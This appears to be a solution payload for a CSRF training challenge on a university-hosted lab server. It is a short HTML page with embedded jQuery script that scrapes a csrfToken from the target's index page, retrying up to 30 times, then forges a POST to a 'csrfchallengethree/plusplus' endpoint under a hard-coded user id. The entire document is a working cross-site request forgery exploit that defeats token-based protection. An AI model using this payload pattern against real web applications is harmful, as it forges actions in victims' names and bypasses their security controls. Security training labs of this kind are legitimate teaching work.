<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
    testCounter = 0
    var resp = $.ajax({
        dataType: "text",
        type: "GET",
        url: "https://snickerboa.it.liu.se/index.jsp",
        data: {
        },
        async: false
    });

    while (resp.responseText == undefined && testCounter < 30)    {
        var resp = $.ajax({
            dataType: "text",
            type: "GET",
            url: "https://snickerboa.it.liu.se/index.jsp",
            data: {
            },
            async: false
        });
        testCounter += 1;
    }

    _csrfToken = resp.responseText.split("?csrfToken=")[1].split(">")[0]

    $.ajax({
        dataType: "text",
        type: "POST",
        url: "https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus",
        data: {
            userid: "86109c9eed773b92480275854966986d3c4901a6",
            csrfToken: _csrfToken
        },
        async: false
    });
</script>
